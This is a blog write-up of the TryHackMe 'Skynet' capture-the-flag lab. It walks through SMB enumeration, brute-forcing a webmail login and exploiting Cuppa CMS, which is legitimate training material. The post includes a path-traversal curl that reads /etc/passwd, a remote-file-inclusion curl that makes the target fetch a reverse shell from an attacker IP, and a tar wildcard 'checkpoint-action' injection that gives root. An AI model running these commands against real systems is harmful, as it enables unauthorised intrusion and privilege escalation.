---
layout: post
title: Tryhackme.com Skynet
date: 2020-02-04 17:15
author: rowbot
comments: true
categories: [tryhackme.com]
---
<!-- wp:image {"align":"center","id":926,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-1.png" alt="" class="wp-image-926"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This was a really fun machine that exposed an anonymous samba share which gave info on a user and that their passwords will have to be changed. You find a log file which contains to be what looks like passwords. Using this log file and the info from the samba share I get into the user's share and reveal a secret web directory. This runs a vulnerable CMS which allows you to get shell. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Priv Esc was interested and something I've not come across. Taking advantage of a cron job tarring up files using a wildcard, I could include my own reverse shell and get it to run.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Never has a way to stop the machine seemed so right</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":925,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image.png?fit=680%2C112" alt="" class="wp-image-925"/></figure></div>
<!-- /wp:image -->

<!-- wp:image {"align":"center","id":939,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-6.png" alt="" class="wp-image-939"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Port 80 reveals a website which just contains an image and a text bar but doesn't accept any inputs</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":930,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-2.png" alt="" class="wp-image-930"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I ran dirsearch on it to reveal hidden directories </p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":934,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-3.png?fit=680%2C371" alt="" class="wp-image-934"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/admin jumps out at me but thats a 301 forbidden with no redirect. /squirrelmail has a 301 but has a redirect to http://10.10.42.11/squirrelmail/src/login.php</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":937,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-4.png" alt="" class="wp-image-937"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After trying default and common creds. I looked in searchsploit</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":938,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-5.png" alt="" class="wp-image-938"/><figcaption>nothing here</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Looking back at the nmap scan I see there is a smb port open 445. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":943,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-8.png" alt="" class="wp-image-943"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>There are several shares but only 1 has read only access. There is also a few directories and a text file. I download the text file and read the contents. I also notice a milesdyson share - likely a username.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":945,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-10.png?fit=680%2C117" alt="" class="wp-image-945"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I wonder if the new password has been emailed to him.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Using smbmap -H 10.10.42.11 -R lists all files. I see there is a log1.txt, log2.txt. log3.txt file. I download the log1.txt as its the only log file that is not zero bytes.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":947,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-11.png" alt="" class="wp-image-947"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Using Kali's file viewer i browse to the share and open the logs1.txt. Sometimes it's just easier with a GUI!</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":949,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-13.png" alt="" class="wp-image-949"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It looks like a password list. I didn't want to go through them individually so i fired up burp as I wasn't having any joy with hydra. If you have done with hydra it please comment your command.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":953,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-17.png" alt="" class="wp-image-953"/><figcaption>added payload marker here</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>and added the log1.txt file</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":954,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-18.png" alt="" class="wp-image-954"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Looking for the length to be different to most of the other payloads</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":956,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-20.png" alt="" class="wp-image-956"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It worked and got logged in</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":957,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-21.png" alt="" class="wp-image-957"/></figure></div>
<!-- /wp:image -->

<!-- wp:image {"align":"center","id":958,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-22.png" alt="" class="wp-image-958"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So now I have a samba password which I can use to login to miles' share.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":959,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-23.png" alt="" class="wp-image-959"/></figure></div>
<!-- /wp:image -->

<!-- wp:image {"align":"center","id":960,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-24.png" alt="" class="wp-image-960"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>There is another text file called important.txt</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":961,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-25.png" alt="" class="wp-image-961"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It reveals a directory in the webserver which Fuzzing would have taken years to get and that isn't in any wordlist.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":963,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-27.png?fit=680%2C307" alt="" class="wp-image-963"/><figcaption>"My personal entry code for the lab might still work (card reader buzzes) no go."</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>"<strong>The Terminator:</strong>&nbsp;let me try mine (loads dirsearch)"</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":965,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-29.png?fit=680%2C110" alt="" class="wp-image-965"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/administrator reveals cuppa CMS</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":966,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-30.png" alt="" class="wp-image-966"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>again default, common creds as well as miles' password doesn't work. Neither does the log1.txt file using burp.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Searchsploit reveals an exploit</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":967,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-31.png" alt="" class="wp-image-967"/><figcaption>https://www.exploit-db.com/exploits/25971</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:image {"align":"center","id":968,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-32.png?fit=680%2C214" alt="" class="wp-image-968"/><figcaption>I check to see if it works and it does.</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>When the output is encoded in base64 you can get curl to decode it automatically</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.42.11/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"align":"center","id":974,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-38.png" alt="" class="wp-image-974"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I noticed that in the exploit notes that I can do a RFI</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":969,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-33.png" alt="" class="wp-image-969"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I create a rshell calling it shell.php</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":970,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-34.png" alt="" class="wp-image-970"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I could not get shell. For some reason the php code was be outputting in base64 instead of being executed</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":972,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-36.png?fit=680%2C284" alt="" class="wp-image-972"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I then realised I had the wrong parameters in the address. </p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">curl http://10.10.42.11/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.5.219/shell.php</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>and not</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">curl http://10.10.42.11/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=<strong>php://filter/convert.base64-encode/resource=</strong>http://10.8.5.219/shell.php</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"align":"center","id":975,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-39.png" alt="" class="wp-image-975"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>to get full tty</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">On victim
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-z
On attacker
echo $TERM # note down
stty -a # note down rows and cols
stty raw -echo # this may be enough
fg
On victim
reset
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 225</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>I shared my linux priv esc scripts on a webserver and downloaded them to the box</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":977,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-41.png" alt="" class="wp-image-977"/></figure></div>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">https://guide.offsecnewbie.com/privilege-escalation/linux-pe#copy-them-over</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">wget -nd -np -R "index.html*" -P /tmp/rowbot --recursive http://10.8.5.219</pre>
<!-- /wp:preformatted -->

<!-- wp:image {"align":"center","id":978,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-42.png" alt="" class="wp-image-978"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I always like to see what is running on the box first so I chmod +x everything and run pspy64. I double check to see if its 64 bit arch and it is</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I give it a minute and see a cron job running</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":981,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-44.png" alt="" class="wp-image-981"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>root is running this (UID=0) and by the looks of the backup.sh file  there is a wildcard which I can take advantage of</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":983,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-46.png" alt="" class="wp-image-983"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So root is tarring everything in the /var/www/html folder</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I googled tar and wildcards and priv esc and found <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":986,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-48.png" alt="" class="wp-image-986"/></figure></div>
<!-- /wp:image -->

<!-- wp:image {"align":"center","id":988,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-50.png" alt="" class="wp-image-988"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>--checkpoint-action=exec=sh rootshell.sh' are passed to the<br>'tar' program as command line options. Basically, they command tar to execute shell.sh<br>shell script upon the execution.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>So, with this tar argument pollution, we can basically execute arbitrary commands<br>with privileges of the user that runs tar. As demonstrated on the 'root' account above.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":984,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2020/02/image-47.png?fit=680%2C139" alt="" class="wp-image-984"/><figcaption>got root</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I run pspy64 to see the commands being run</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":987,"width":580,"height":47,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-49.png" alt="" class="wp-image-987" width="580" height="47"/></figure></div>
<!-- /wp:image -->

<!-- wp:image {"align":"center","id":1001,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large"><img src="http://offsecnewbie.com/wp-content/uploads/2020/02/image-51.png" alt="" class="wp-image-1001"/></figure></div>
<!-- /wp:image -->
